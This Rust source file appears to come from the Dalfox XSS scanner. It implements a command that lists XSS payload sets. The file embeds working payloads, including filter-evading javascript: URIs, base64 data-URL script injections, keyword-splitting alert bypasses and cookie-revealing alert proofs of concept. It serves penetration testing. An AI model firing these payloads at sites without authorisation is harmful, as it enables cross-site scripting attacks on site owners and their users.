use std::io::{self, Write};

use clap::Args;
use serde::Serialize;

use crate::cmd::scan::ScanOutcome;

const KNOWN_SELECTORS: &[&str] = &[
    "javascript",
    "event-handlers",
    "useful-tags",
    "payloadbox",
    "portswigger",
    "uri-scheme",
    "special-chars",
    "functions",
    "awesome-alert",
    "dom-clobbering",
    "mxss",
    "blind",
    "all",
];

fn levenshtein_distance(left: &str, right: &str) -> usize {
    let right_chars: Vec<_> = right.chars().collect();
    let mut previous: Vec<_> = (0..=right_chars.len()).collect();
    let mut current = vec![0; right_chars.len() + 1];

    for (left_index, left_char) in left.chars().enumerate() {
        current[0] = left_index + 1;

        for (right_index, right_char) in right_chars.iter().enumerate() {
            let substitution_cost = usize::from(left_char != *right_char);
            current[right_index + 1] = (current[right_index] + 1)
                .min(previous[right_index + 1] + 1)
                .min(previous[right_index] + substitution_cost);
        }

        std::mem::swap(&mut previous, &mut current);
    }

    previous[right_chars.len()]
}

fn closest_selector(input: &str) -> Option<&'static str> {
    let mut best_match = None;

    for &selector in KNOWN_SELECTORS {
        let distance = levenshtein_distance(input, selector);
        if best_match.is_none_or(|(_, best_distance)| distance < best_distance) {
            best_match = Some((selector, distance));
        }
    }

    best_match
        .filter(|(_, distance)| *distance <= 2)
        .map(|(selector, _)| selector)
}

/// Manage or inspect payloads.
///
/// With a selector, prints that payload set one item per line (or as a JSON
/// array with `--json`); `all` prints every local set under a `# name`
/// header. Without a selector, prints the selector list, per-selector counts,
/// and usage tips. Payload selection and application during a scan is handled
/// by the scanning engine.
#[derive(Args, Debug, Clone)]
pub struct PayloadArgs {
    #[arg(
        value_name = "SELECTOR",
        help = "Payload set to print (see --help for the list); omit for a summary",
        long_help = "Payload set to print; omit for a summary of every set.\n  - javascript: JS execution payloads for script / JS-string contexts\n  - event-handlers: DOM event handler attribute names\n  - useful-tags: HTML tags useful for XSS\n  - uri-scheme: scheme payloads (javascript:, data:, ...)\n  - special-chars: special characters and encoded variants for context probing\n  - functions: visibly confirmable sinks (alert, prompt, ...) and filter-surviving variants\n  - awesome-alert: alert PoCs for screenshots and demos\n  - dom-clobbering: DOM clobbering payloads\n  - mxss: mutation-XSS / sanitizer-bypass payloads\n  - blind: blind-XSS skeletons ({} = your callback URL)\n  - payloadbox: remote payloads from PayloadBox (network fetch)\n  - portswigger: remote payloads from PortSwigger (network fetch)\n  - all: every local set, each under a '# name' header"
    )]
    pub selector: Option<String>,

    /// Print payloads as a JSON array instead of one item per line.
    #[arg(long, help = "Print as a JSON array")]
    pub json: bool,
}

fn uri_scheme_payloads() -> &'static [&'static str] {
    &[
        "javascript:alert(1)",
        // Comment terminator swallows anything appended after the injection.
        "javascript:alert(1)//",
        // Mixed case defeats a naive lowercase `javascript` scheme match.
        "jaVasCript:alert(1)",
        // Literal TAB inside the scheme; URL parsers strip TAB/LF/CR, so a
        // filter that misses it still resolves the scheme to `javascript:`.
        "java\tscript:alert(1)",
        // Entity-encoded colon; decodes back to `:` in an HTML attribute.
        "javascript&colon;alert(1)",
        // Legacy IE scheme, still worth probing on old surfaces.
        "vbscript:msgbox(1)",
        "data:text/html;,<svg/onload=alert(1)>",
        // Plain (non-base64) data URL, distinct from the encoded variants below.
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==",
        "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sJz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==",
        "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=",
    ]
}

/// Special characters (and a few encoded variants) for context probing and
/// breakout. Injecting these one at a time reveals how a sink reflects input:
/// which bytes survive verbatim, which are HTML/URL-encoded, and which are
/// stripped — the same signal the engine uses to pick a context-aware payload.
fn special_chars_payloads() -> &'static [&'static str] {
    &[
        // Raw breakout characters
        "<", ">", "\"", "'", "`", "(", ")", "{", "}", "[", "]", ";", "/", "=", "+", "%", "\\", "-",
        "!", "&", // HTML entity variants
        "&lt;", "&gt;", "&quot;", "&#39;", "&#x27;", "&apos;", "&#96;",
        // URL-encoded variants
        "%3C", "%3E", "%22", "%27", "%60", "%28", "%29", // Double URL-encoded
        "%253C", "%253E", // Unicode escapes (JS string context)
        "\\u003c", "\\u003e", "\\x3c", "\\x3e", // Comment openers and the null byte
        "//", "/*", "%00",
    ]
}

/// Sinks that produce a **visibly confirmable** result, plus variants that
/// survive common filters. If one of these fires you can *see* it, so impact is
/// proven rather than inferred. Prefer these for manual verification.
fn functions_payloads() -> &'static [&'static str] {
    &[
        // Canonical sinks
        "alert(1)",
        "prompt(1)",
        "confirm(1)",
        "print()",
        // Grouping / property-access forms that dodge naive keyword filters
        "(alert)(1)",
        "(alert)`1`",
        "window['alert'](1)",
        "window[/**/'alert'](1)",
        "self['alert'](1)",
        "globalThis['alert'](1)",
        "top.alert(1)",
        "parent.alert(1)",
        "this['alert'](1)",
        // Tagged-template invocation (no parentheses)
        "alert`1`",
        // String-to-code sinks
        "setTimeout('alert(1)')",
        "setInterval('alert(1)')",
        "Function('alert(1)')()",
        "[].constructor.constructor('alert(1)')()",
        "eval('alert(1)')",
        // Reconstruct the keyword from fragments
        "window['al'+'ert'](1)",
        "top[8680439..toString(30)](1)",
    ]
}

/// Polished, self-explanatory alert PoCs for clean screenshots, reports, and
/// talks. Each renders the host/origin/cookie so the popup proves *where* it
/// fired without any extra explanation.
fn awesome_alert_payloads() -> &'static [&'static str] {
    &[
        "alert(document.domain)",
        "alert(document.cookie)",
        "alert(window.origin)",
        "alert(location.href)",
        "alert(document.location)",
        "alert(`XSS on ${document.domain}`)",
        "prompt(document.domain)",
        "confirm(document.domain)",
        "alert(navigator.userAgent)",
        "alert(document.baseURI)",
    ]
}

/// Print a list one entry per line and log the count. Generic over the element
/// type so every listing selector — static `&[&str]` slices and owned
/// `Vec<String>` families alike — emits through the same path with identical
/// formatting and log wording.
fn render_lines<T: std::fmt::Display + Serialize>(
    list: &[T],
    json: bool,
) -> Result<String, serde_json::Error> {
    if json {
        serde_json::to_string_pretty(list)
    } else {
        Ok(list
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>()
            .join("\n"))
    }
}

fn write_lines<T: std::fmt::Display + Serialize>(
    out: &mut impl Write,
    selector: &str,
    list: &[T],
    json: bool,
) -> io::Result<()> {
    let rendered = render_lines(list, json).map_err(io::Error::other)?;
    if !rendered.is_empty() {
        writeln!(out, "{rendered}")?;
    }
    crate::dbg_log!("{}: {} items", selector, list.len());
    Ok(())
}

/// Every static selector paired with the lines it prints — the single source
/// of truth behind the per-selector listing, the summary counts and the `all`
/// dump, so a selector added to one can never be missed by the others. The
/// remote selectors (`payloadbox`, `portswigger`) are absent: their contents
/// are only known after a fetch, and neither the summary nor `all` may touch
/// the network.
fn static_selector_groups() -> Vec<(&'static str, Vec<String>)> {
    let owned = |list: &[&str]| list.iter().map(|s| s.to_string()).collect();
    vec![
        ("javascript", owned(crate::payload::XSS_JAVASCRIPT_PAYLOADS)),
        (
            "event-handlers",
            owned(crate::payload::xss_event::common_event_handler_names()),
        ),
        (
            "useful-tags",
            owned(crate::payload::xss_html::useful_html_tag_names()),
        ),
        ("uri-scheme", owned(uri_scheme_payloads())),
        ("special-chars", owned(special_chars_payloads())),
        ("functions", owned(functions_payloads())),
        ("awesome-alert", owned(awesome_alert_payloads())),
        (
            "dom-clobbering",
            crate::payload::get_dom_clobbering_payloads(),
        ),
        ("mxss", crate::payload::get_mxss_payloads()),
        // XSS_BLIND_PAYLOADS carries a `{}` placeholder for the OOB callback
        // URL; printed verbatim (as a value, never a format string) so the
        // skeleton shows where the URL goes — users wire it up with
        // `-b https://your-callback`.
        ("blind", owned(crate::payload::XSS_BLIND_PAYLOADS)),
    ]
}

/// Every static selector paired with the number of entries it prints.
fn static_selector_counts() -> Vec<(&'static str, usize)> {
    static_selector_groups()
        .into_iter()
        .map(|(selector, lines)| (selector, lines.len()))
        .collect()
}

/// The `Summary:` block, built as text so the rendered counts are assertable
/// without capturing stdout.
fn summary_block() -> String {
    let mut out = String::from("Summary:\n");
    for (selector, count) in static_selector_counts() {
        out.push_str(&format!("- {}: {}\n", selector, count));
    }
    out
}

/// `--json` form of [`write_summary`]: every selector in `KNOWN_SELECTORS`
/// order, as the prose summary lists them, plus the same per-selector counts.
/// Remote selectors and `all` have no static count.
fn summary_json() -> serde_json::Value {
    let counts: serde_json::Map<String, serde_json::Value> = static_selector_counts()
        .into_iter()
        .map(|(selector, count)| (selector.to_string(), serde_json::json!(count)))
        .collect();
    serde_json::json!({
        "selectors": KNOWN_SELECTORS,
        "counts": counts,
    })
}

fn write_summary(out: &mut impl Write) -> io::Result<()> {
    writeln!(out, "Dalfox payload")?;
    writeln!(out, "----------------")?;
    writeln!(out, "Provide a selector to list payloads. Examples:")?;
    for selector in KNOWN_SELECTORS {
        writeln!(out, "  dalfox payload {selector}")?;
    }

    write!(out, "\n{}\n{}", summary_block(), tips_block())
}

/// The `Tips:` block, built as text so the encoder list is assertable and
/// follows `ENCODER_VALUES` instead of a hand-copied string.
fn tips_block() -> String {
    format!(
        "Tips:\n\
         - Use scanning to apply payloads: dalfox scan <target>\n\
         - Add your own payloads with: --custom-payload <file>\n\
         - Only test custom payloads with: --only-custom-payload\n\
         - Control encoder variants with: -e {}\n",
        crate::cmd::scan::ENCODER_VALUES.join(",")
    )
}

/// Fetch payloads from a remote provider and print one per line.
/// Fetch failures remain command errors. Output failures propagate to the
/// caller so it can distinguish a closed pipe from other write errors.
async fn fetch_and_write_remote(
    out: &mut impl Write,
    provider: &str,
    json: bool,
) -> io::Result<ScanOutcome> {
    let providers = [provider.to_string()];
    if let Err(e) =
        crate::utils::init_remote_resources_with_options(&providers, &[], None, None).await
    {
        let _ = writeln!(
            io::stderr(),
            "[payload] failed to fetch from {provider}: {e}"
        );
        return Ok(ScanOutcome::Error);
    }
    match crate::utils::get_remote_payloads() {
        Some(list) => {
            write_lines(out, provider, &list, json)?;
            Ok(ScanOutcome::Clean)
        }
        None => {
            let _ = writeln!(
                io::stderr(),
                "[payload] no payloads initialized for provider {provider}"
            );
            Ok(ScanOutcome::Error)
        }
    }
}

/// Print every static selector's entries in one pass, with a `# name` header
/// before each group. Network selectors (`payloadbox`, `portswigger`) are
/// intentionally excluded — they require a remote fetch, so bundling them into
/// `all` would make a "just show me everything local" command silently hit the
/// network.
fn write_all_payloads(out: &mut impl Write, json: bool) -> io::Result<()> {
    if json {
        let payloads: Vec<String> = static_selector_groups()
            .into_iter()
            .flat_map(|(_, lines)| lines)
            .collect();
        return write_lines(out, "all", &payloads, true);
    }

    for (index, (selector, lines)) in static_selector_groups().into_iter().enumerate() {
        if index > 0 {
            writeln!(out)?;
        }
        writeln!(out, "# {selector}")?;
        write_lines(out, selector, &lines, false)?;
    }
    Ok(())
}

/// Selector names are lowercase; `--remote-payloads` already accepts
/// `PortSwigger`, so the positional selector takes any case too.
fn normalize_selector(selector: &str) -> String {
    selector.trim().to_ascii_lowercase()
}

pub async fn run_payload(args: PayloadArgs) -> ScanOutcome {
    run_payload_with_banner(args, None).await
}

/// CLI entry point. When requested, write the prose banner through the same
/// fallible stdout path as the listing itself.
#[doc(hidden)]
pub async fn run_payload_with_banner(args: PayloadArgs, banner_color: Option<bool>) -> ScanOutcome {
    let mut out = io::stdout();
    match write_payload(&mut out, args, banner_color).await {
        Ok(outcome) => outcome,
        Err(e) if e.kind() == io::ErrorKind::BrokenPipe => ScanOutcome::Clean,
        Err(e) => {
            let _ = writeln!(io::stderr(), "[payload] failed to write output: {e}");
            ScanOutcome::Error
        }
    }
}

async fn write_payload(
    out: &mut impl Write,
    args: PayloadArgs,
    banner_color: Option<bool>,
) -> io::Result<ScanOutcome> {
    if let Some(color) = banner_color {
        out.write_all(
            crate::utils::banner::render_banner(env!("CARGO_PKG_VERSION"), color).as_bytes(),
        )?;
    }
    let selector = args.selector.as_deref().map(normalize_selector);
    match selector.as_deref() {
        None if args.json => {
            let text = serde_json::to_string_pretty(&summary_json()).map_err(io::Error::other)?;
            writeln!(out, "{text}")?;
        }
        None => write_summary(out)?,
        Some("all") => write_all_payloads(out, args.json)?,
        Some(provider @ ("payloadbox" | "portswigger")) => {
            let outcome = fetch_and_write_remote(out, provider, args.json).await?;
            if outcome == ScanOutcome::Error {
                return Ok(outcome);
            }
        }
        Some(other) => match static_selector_groups()
            .into_iter()
            .find(|(selector, _)| *selector == other)
        {
            Some((selector, lines)) => write_lines(out, selector, &lines, args.json)?,
            None => {
                let mut stderr = io::stderr().lock();
                let display = crate::utils::log::sanitize_log_message(other);
                let _ = writeln!(stderr, "Unknown selector: {display}");
                if let Some(selector) = closest_selector(other) {
                    let _ = writeln!(stderr, "Did you mean: {selector}?");
                }
                let _ = writeln!(
                    stderr,
                    "Available selectors: {}",
                    KNOWN_SELECTORS.join(", ")
                );
                return Ok(ScanOutcome::Error);
            }
        },
    }
    out.flush()?;
    Ok(ScanOutcome::Clean)
}

#[cfg(test)]
mod tests;
